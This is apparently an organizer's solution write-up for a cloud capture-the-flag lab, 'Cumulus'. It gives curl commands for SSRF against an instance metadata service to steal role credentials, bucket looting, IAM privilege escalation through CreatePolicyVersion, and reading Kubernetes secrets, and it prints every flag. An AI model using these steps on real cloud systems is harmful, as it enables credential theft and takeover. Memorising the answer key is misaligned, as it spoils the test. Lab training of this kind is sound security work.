# Cumulus — full solution (ORGANIZER)

The whole chain is driven from the attacker's position: the public web app, then
the cloud APIs with stolen credentials. The reference solver is
[../scripts/solve.py](../scripts/solve.py); `make check` runs it in-network.
Host-side with `curl`:

```bash
WEB=http://localhost:8097 ; CP=http://localhost:8098 ; K8S=http://localhost:8099
```

---

## 1 — Metadata theft (SSRF → IMDS)
```bash
curl "$WEB/fetch?url=http://imds/latest/user-data"                       # flag 1
curl "$WEB/fetch?url=http://imds/latest/meta-data/iam/security-credentials/cumulus-web-instance"
# -> {"AccessKeyId":"ASIACUMULUSINSTANCE01", ...}
```
Flag `CLD{ssrf_t0_1mds_st0l3_1nstanc3_r0l3_cr3ds}`.

## 2 — Bucket loot (S3 misconfig)
```bash
H='X-Cloud-Access-Key: ASIACUMULUSINSTANCE01'
curl -H "$H" "$CP/s3/cumulus-backups"                                    # list
curl -H "$H" "$CP/s3/cumulus-backups/flag.txt"                           # flag 2
curl -H "$H" "$CP/s3/cumulus-backups/iam/devops-ci-access-key.json"      # -> AKIADEVOPS0000STAGE2
```
Flag `CLD{s3_bucket_m1sc0nf1g_r34d_th3_b4ckups}`.

## 3 — Privilege escalation (IAM CreatePolicyVersion)
```bash
D='X-Cloud-Access-Key: AKIADEVOPS0000STAGE2'
curl -H "$D" -H 'Content-Type: application/json' -X POST "$CP/iam/CreatePolicyVersion" \
  -d '{"PolicyName":"devops-policy","PolicyDocument":{"Statement":[{"Action":"*","Resource":"*"}]}}'
curl -H "$D" "$CP/iam/whoami"                                            # Admin:true + flag 3
```
Flag `CLD{1am_cr34t3p0l1cyv3rs10n_pr1v3sc_t0_4dm1n}`.

## 4 — Cluster takeover (EKS → k8s secret)
```bash
TOK=$(curl -s -H "$D" "$CP/sts/eks-get-token" | python3 -c 'import sys,json;print(json.load(sys.stdin)["status"]["token"])')
curl -H "Authorization: Bearer $TOK" "$K8S/api/v1/namespaces/kube-system/secrets/cluster-master"
# data.flag is base64:  echo <that> | base64 -d
```
Flag `CLD{3ks_aws_auth_t0_k8s_s3cr3ts_cr0wn}`.

---

## One-shot

```bash
make up && make check     # -> ALL 4 FLAGS CAPTURED, exit 0
```
